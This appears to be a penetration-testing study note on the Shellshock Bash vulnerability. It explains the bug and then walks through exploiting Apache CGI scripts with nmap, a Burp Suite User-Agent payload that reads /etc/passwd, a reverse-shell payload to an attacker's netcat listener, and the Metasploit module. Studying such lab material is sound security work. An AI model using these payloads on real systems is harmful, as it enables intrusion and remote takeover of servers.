Shellshock is the name given to a family of vulnerabilities in the Bash shell (since V1.3) that allows an attacker to execute remote arbitrary commands via Bash, consequently allowing the attacker to obtain remote access to the target via a reverse shell.

Bash is a *Nix (unix) shell that is the part of the GNU project and is a default shell for most Linix distributions. Shell is a command line interface

Shellshock vuln. is caused by a vuln. in Bash whereby Bash mistakenly executes trailing commands after a series of characters: () {:;};

In the context of remote exploitation, Apache web servers configured to run CGI scripts or .sh scripts are also vuln. to this attack.

CGI (Common Gateway Interface) scripts are used by Apache to execute arbitrary commands on the Linux system, after which the output is displayed to the client

In order to exploit this vuln. you will need to locate an input vector or script that allows you to communicate with Bash.

In the context of an Apache web server, we can utilzate and legit CGI scripts accessible on the web server.

Whenever a CGI script is executed, the web server will initiate a new process and run the CGI script with bash.

This vuln. can be exploited manually and automatically with the use of an MSF exploit module

------------------------------Exploitation-------------------------------------

nmap -sV <ip>

**identify Apache Web Server**
**to identify CGI scripts, you're looking for something dynamic such as an active timer/countdown, things like this do NOT exhibit html, css attributes**

**view source of the page and you can look for GET"./gettime.cgi", true); something like that. /gettime.cgi is an actual directory you can browse to**
**this script can be utilized as our input vector**

nmap -sV <ip> --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"

**turn on foxyproxy and redirect traffic to burpsuite**
**click to proxy and turn intercept on, now reload the webpage at the cgi directory**

**send the request from proxy to repeater and replace user-agent info with the special characters**
() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
**we can also set up a reverse shell**
nc -nvlp <port>
**from burp we can send another request**
() { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/<yourip>/<ncport> 0>&1'
whoami
cat /etc/*issue (shows version)
uname -a (kernal info)

-----------------------------------Metasploit Exploit------------------------

msfconsole
search shellshock
**auxiliary module will scan to see if the web is vulnerable**
use exploit/multi/http/apache_mod_cgi_bash_env_exec
**set ip and port the webserver is on**
**set TARGETURI /gettime.cgi (or whatever path the cgi script is on)
run


